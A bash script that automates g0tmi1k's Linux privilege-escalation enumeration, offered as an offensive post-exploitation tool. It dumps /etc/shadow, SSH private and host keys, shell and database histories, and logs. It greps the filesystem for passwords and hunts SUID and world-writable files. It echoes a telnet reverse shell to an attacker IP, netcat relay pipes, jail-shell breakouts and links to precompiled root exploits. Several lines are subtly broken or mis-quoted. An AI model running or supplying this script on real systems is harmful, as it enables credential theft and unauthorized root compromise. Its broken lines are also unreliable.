#!/bin/bash

# Automate g0tmi1k's enumeration
# https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

function _help_menu(){
    echo '    --os-kernel'
    echo '        Grab the kernel information'
    echo '    --envs'
    echo '        Grab your environment information'
    echo '    --dev-tools'
    echo '        See which dev tools are on box'
    echo '    --file-transfers'
    echo '        See which tools exist for file transfer'
    echo '    --network'
    echo '        Looking at networking'
    echo '    --shell-options'
    echo '        Reverse shell options'
    echo '    --processes'
    echo '        Look at running processes'
    echo '    --printers'
    echo '        See which printers exist'
    echo '    --file-mounts'
    echo '        Look at all file mount options'
    echo '    --user-details'
    echo '        Details about this user and others'
    echo '    --sticky-bits'
    echo '        Sticky bits that may help with priv esc'
    echo '    --nobody-files'
    echo '        Files that are owned by nobody'
    echo '    --apps-installed'
    echo '        All installed packages'
    echo '    --misconfigured-services'
    echo '        Find services and look at user/group settings'
    echo '    --scheduled-jobs'
    echo '        Look for scheduled jobs - mainly cronjobs'
    echo '    --find-users-passwords'
    echo '        Spammy - do not recommend unless needed'
    echo '    --file-system-search'
    echo '        Sensitive files, configs, dbs, web app files'
    echo '    --log-files'
    echo '        Look at every log file'
    echo '    --jail-shell-breakout'
    echo '        Example breakout, there are a ton of ways to do this'
    echo '    --exploits'
    echo '        Places to visit for exploits'
    echo '    --all'
    echo '        Everything - very verbose'
    echo '    --help'
    echo '        '
    exit
}

function operating_system(){
    echo "# Operating System #"
    cat /etc/issue
    cat /etc/*-release
    cat /etc/lsb-release# Debian based
    cat /etc/redhat-release# Redhat based
}

function kernel_version() {
    echo "# Kernel #"
    cat /proc/version
    uname -a
    uname -mrs
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-
}

function environment_variables() {
    echo "# Environment variables  #"
    echo "## /etc/profile ##"
    cat /etc/profile
    echo '## /etc/bashrc ##'
    cat /etc/bashrc
    echo "## /etc/.bash_profile ##"
    cat ~/.bash_profile
    echo "## .bashrc ##"
    cat ~/.bashrc
    echo "## .bash_logout ##"
    cat ~/.bash_logout
    echo "## env ##"
    env
    echo "## set ##"
    set
}

function check_printers(){
    echo "# Printers #"
    lpstat -a
}

function running_services() {
    echo "# Running Services #"
    ps aux
    ps -ef
    ps eaf --forest
    #top
    #cat /etc/services
}

function services_running_by_root() {
    echo "# Services ran by Root #"
    ps aux | grep root
    ps -ef | grep root
}

function applications_installed() {
    echo "# Applications installed #"
    ls -alh /usr/bin/
    ls -alh /sbin/
    dpkg -l
    rpm -qa
    ls -alh /var/cache/apt/archivesO
    ls -alh /var/cache/yum/
}

function misconfigured_services(){
    echo "# Misconfigured services or vulnerable versions #"
    echo "## /etc/syslog.conf ##"
    cat /etc/syslog.conf
    echo "## /etc/chttp.conf ##"
    cat /etc/chttp.conf
    echo "## /etc/lighttpd.conf ##"
    cat /etc/lighttpd.conf
    echo "## /etc/cups/cupsd.conf ##"
    cat /etc/cups/cupsd.conf
    echo "## /etc/inetd.conf ##"
    cat /etc/inetd.conf
    echo "## /etc/apache2/apache2.conf ##"
    cat /etc/apache2/apache2.conf
    echo "## /etc/my.conf ##"
    cat /etc/my.conf
    echo "## /etc/httpd/conf/httpd.conf ##"
    cat /etc/httpd/conf/httpd.conf
    echo "## /opt/lampp/etc/httpd.conf ##"
    cat /opt/lampp/etc/httpd.conf
    echo "## etc directory ##"
    ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
}

function scheduled_jobs(){
    echo "# Scheduled and cronjobs #"
    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    ls /etc/cron*/*
    #cat /etc/cron*/*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root
}

function plaintext_usernames_passwords(){
    echo "# Plaintext Usernames and Passwords #"
    for i in $(ls /); do
        if [ $i == 'proc' ]; then
            continue
        fi
        echo $i
	grep -ir user /$i 2>/dev/null
        grep -ir pass /$i 2>/dev/null
        grep -Cr 5 "password" /$i 2>/dev/null
        find /$i -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 2>/dev/null # Joomla
    done
    #grep -ir user / 2>/dev/null
    #grep -ir pass / 2>/dev/null
    #grep -Cr 5 "password" / 2>/dev/null
    #find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 2>/dev/null # Joomla
}

function network_interfaces(){
    echo "# Network Interfaces #"
    /sbin/ifconfig -a
    cat /etc/network/interfaces
    cat /etc/sysconfig/network
}

function network_configs(){
    echo "# Network Configuration #"
    cat /etc/resolv.conf
    cat /etc/sysconfig/network
    cat /etc/networks
    iptables -L
    hostname
    dnsdomainname
}

function other_users(){
    echo "# Other Users and Hosts Communication to this box #"
    lsof -i
    lsof -i :80
    grep 80 /etc/services
    netstat -antup
    netstat -antp
    ss -antp
    netstat -antpx
    netstat -tulpn
    chkconfig --list
    chkconfig --list | grep 3:on
    last
    w
}

function cached_ip_mac(){
    echo "# Cached IP and MAC Addresess #"
    arp -e
    route
    /sbin/route -nee
}

function can_we_tcpdump(){
    echo "# Can we TcpDump #"
    which tcpdump
}

function quick_shell(){
    echo "# Unencrypted shell #"
    echo 'nc -lvp 4444    # Attacker. Input (Commands)'
    echo 'nc -lvp 4445    # Attacker. Ouput (Results)'
    echo 'telnet [attackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!'
    echo 'Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/'
}

function port_forwarding(){
    echo "# Port Forwarding Check #"
    echo 'Note: http://www.boutell.com/rinetd/'
    echo 'Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch'
    echo 'Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip'
    echo 'Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]'
    echo 'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7'
    echo 'Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]'
    echo 'ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port'
    echo 'ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port'
    echo 'Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe'
    echo 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay'
    echo 'mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)'
    echo 'mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)'

}

function can_we_tunnel(){
    echo "# Can we tunnel #"
    echo 'ssh -D 127.0.0.1:9050 -N [username]@[ip]'
    echo 'proxychains ifconfig'
}

function all_the_users(){
    echo "# User Info #"
    id
    who
    w
    last
    cat /etc/passwd | cut -d: -f1    # List of users
    grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
    awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
    cat /etc/sudoers
    sudo -l
}

function sensitive_files(){
    echo "# Sensitive Files #"
    ls -alh /etc/passwd
    cat /etc/passwd
    ls -alh /etc/group
    cat /etc/group
    ls -alh /etc/shadow
    cat /etc/shadow
    ls -alh /var/mail/
}

function home_directories(){
    echo "# Home Directories - check other users#"
    ls -ahlR /root/
    ls -ahlR /home/
}

function dbs_scripts_databases_configs_logs(){
    echo "# Check scripts, configs, dbs #"
    find / -type f -name *config -exec ls -ld {} \; 2>/dev/null
    find / -type f -name *conf -exec ls -ld {} \; 2>/dev/null
    find / -type f -name *cfg -exec ls -ld {} \; 2>/dev/null
    find / -type f -name *.sh -exec ls -ld {} \; 2>/dev/null
    cat /var/apache2/config.inc
    cat /var/lib/mysql/mysql/user.MYD
    cat /root/anaconda-ks.cfg
}

function user_forensics(){
    echo "# What has the user been doing? #"
    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history
}

function user_information_found(){
    echo "# User Information Found #"
    cat ~/.bashrc
    cat ~/.profile
    cat /var/mail/root
    cat /var/spool/mail/root
}

function private_keys(){
    echo "# Finding keys #"
    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key
}

function writeable_etc(){
    echo "# Writeable /etc/ #"
    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
    find /etc/ -readable -type f 2>/dev/null               # Anyone
    find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
}

function whats_in_var(){
    echo "# What is in /var/? #"
    ls -alh /var/log
    ls -alh /var/mail
    ls -alh /var/spool
    ls -alh /var/spool/lpd
    ls -alh /var/lib/pgsql
    ls -alh /var/lib/mysql
    cat /var/lib/dhcp3/dhclient.leases
}

function hidden_web_files(){
    echo "# Hidden files in website directories #"
    ls -alhR /var/www/
    ls -alhR /srv/www/htdocs/
    ls -alhR /usr/local/www/apache22/data/
    ls -alhR /opt/lampp/htdocs/
    ls -alhR /var/www/html/
}

function cat_all_log_files(){
    echo "# Look in log files #"
    cat /etc/httpd/logs/access_log
    cat /etc/httpd/logs/access.log
    cat /etc/httpd/logs/error_log
    cat /etc/httpd/logs/error.log
    cat /var/log/apache2/access_log
    cat /var/log/apache2/access.log
    cat /var/log/apache2/error_log
    cat /var/log/apache2/error.log
    cat /var/log/apache/access_log
    cat /var/log/apache/access.log
    cat /var/log/auth.log
    cat /var/log/chttp.log
    cat /var/log/cups/error_log
    cat /var/log/dpkg.log
    cat /var/log/faillog
    cat /var/log/httpd/access_log
    cat /var/log/httpd/access.log
    cat /var/log/httpd/error_log
    cat /var/log/httpd/error.log
    cat /var/log/lastlog
    cat /var/log/lighttpd/access.log
    cat /var/log/lighttpd/error.log
    cat /var/log/lighttpd/lighttpd.access.log
    cat /var/log/lighttpd/lighttpd.error.log
    cat /var/log/messages
    cat /var/log/secure
    cat /var/log/syslog
    cat /var/log/wtmp
    cat /var/log/xferlog
    cat /var/log/yum.log
    cat /var/run/utmp
    cat /var/webmin/miniserv.log
    cat /var/www/logs/access_log
    cat /var/www/logs/access.log
    ls -alh /var/lib/dhcp3/
    ls -alh /var/log/postgresql/
    ls -alh /var/log/proftpd/
    ls -alh /var/log/samba/
    echo "Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp"
    echo "Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/"
}

function jail_shell_breakout(){
    echo '"# Break out of jail shell #"'
    echo 'python -c 'import pty\;pty.spawn\("/bin/bash"\)''
    echo "os.system('/bin/bash')"
    echo '/bin/sh -i'
    echo 'scp -F /etc/passwd x y:'
    echo 'scp -S /usr/bin/id x y:'
    echo 'PYTHONINSPECT=1 /path/to/some/python-tool.py'
    echo 'echo $(< /path/to/file)'
    echo '$ <TAB> <TAB>'
    echo 'ssh user@host Ctrl+C before prompt appears'
    echo 'rbash_shell_command | grep '' | /bin/bash'
    echo 'export PATH=/bin:$PATH; bash"'
}

function file_mounts(){
    echo "# What is mounted #"
    mount
    df -h
    cat /etc/fstab
    cat /etc/exports
}

function sticky_bits(){
    echo "# Look for sticky bits #"
    echo "## Sticky bit files - only the owner of directory/file can write here ##"
    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
    echo "## Sticky bit files - run as the group owner ##"
    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
    echo "## Sticky bit files - run as the owner, not the user who started ##"
    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
    echo "## SGID or SUID ##"
    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
    echo "## Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) ##"
    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
    echo "## find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors ##"
    # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
}

function problem_nobody_files(){
    echo "# Find world writable and no owner files #"
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null  # world-writeable files
    find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null  # Noowner files
}

function dev_tool_languages(){
    echo "# Find dev tools #"
    which perl
    which python
    which python3
    which gcc
    which cc
    which go
    find / -type f -name perl* 2>/dev/null
    find / -type f -name python* 2>/dev/null
    find / -type f -name gcc* 2>/dev/null
    find / -type f -name cc 2>/dev/null
}

function file_upload_options(){
    echo "# File Upload Options #"
    which wget
    which nc
    which netcat
    which ncat
    which tftp
    which ftp
    find / -name wget 2>/dev/null
    find / -name nc* 2>/dev/null
    find / -name netcat* 2>/dev/null
    find / -name tftp* 2>/dev/null
    find / -name ftp 2>/dev/null
}

function find_exploit_code(){
    echo "# Find exploits #"
    echo 'Finding exploit code'
    echo 'http://www.exploit-db.com'
    echo 'http://1337day.com'
    echo 'http://www.securiteam.com'
    echo 'http://www.securityfocus.com'
    echo 'http://www.exploitsearch.net'
    echo 'http://metasploit.com/modules/'
    echo 'http://securityreason.com'
    echo 'http://seclists.org/fulldisclosure/'
    echo 'http://www.google.com'
    echo 'http://www.cvedetails.com'
    echo 'http://packetstormsecurity.org/files/cve/[CVE]'
    echo 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]'
    echo 'http://www.vulnview.com/cve-details.php?cvename=[CVE]'
    echo '(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk'
    echo 'http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/'
    echo 'http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/'
}

case "$1" in
    --os-kernel)
        operating_system
        kernel_version
        ;;
    --envs)
        environment_variables
        ;;
    --dev-tools)
        dev_tool_languages
        ;;
    --file-transfers)
        file_upload_options
        ;;
    --network)
        network_interfaces
        network_configs
        cached_ip_mac
        can_we_tcpdump
        port_forwarding
        can_we_tunnel
        ;;
    --shell-options)
        quick_shell
        ;;
    --processes)
        running_services
        services_running_by_root
        ;;
    --printers)
        check_printers
        ;;
    --file-mounts)
        file_mounts
        ;;
    --user-details)
        other_users
        all_the_users
        home_directories
        user_forensics
        user_information_found
        ;;
    --sticky-bits)
        sticky_bits
        ;;
    --nobody-files)
        problem_nobody_files
        ;;
    --apps-installed)
        applications_installed
        ;;
    --misconfigured-services)
        misconfigured_services
        ;;
    --scheduled-jobs)
        scheduled_jobs
        ;;
    --find-users-passwords)
        plaintext_usernames_passwords
        ;;
    --file-system-search)
        sensitive_files
        dbs_scripts_databases_configs_logs
        private_keys
        writeable_etc
        whats_in_var
        hidden_web_files
        ;;
    --log-files)
        cat_all_log_files
        ;;
    --jail-shell-breakout)
        jail_shell_breakout
        ;;
    --exploits)
        find_exploit_code
        ;;
    --all)
        operating_system
        kernel_version
        environment_variables
        check_printers
        running_services
        services_running_by_root
        applications_installed
        misconfigured_services
        scheduled_jobs
        plaintext_usernames_passwords
        network_interfaces
        network_configs
        other_users
        cached_ip_mac
        can_we_tcpdump
        quick_shell
        port_forwarding
        can_we_tunnel
        all_the_users
        sensitive_files
        home_directories
        dbs_scripts_databases_configs_logs
        user_forensics
        user_information_found
        private_keys
        writeable_etc
        whats_in_var
        hidden_web_files
        cat_all_log_files
        jail_shell_breakout
        file_mounts
        sticky_bits
        problem_nobody_files
        dev_tool_languages
        file_upload_options
        find_exploit_code
        ;;
    -h)
        _help_menu
        ;;
    --help)
        _help_menu
        ;;
    *)
        _help_menu
        ;;
esac
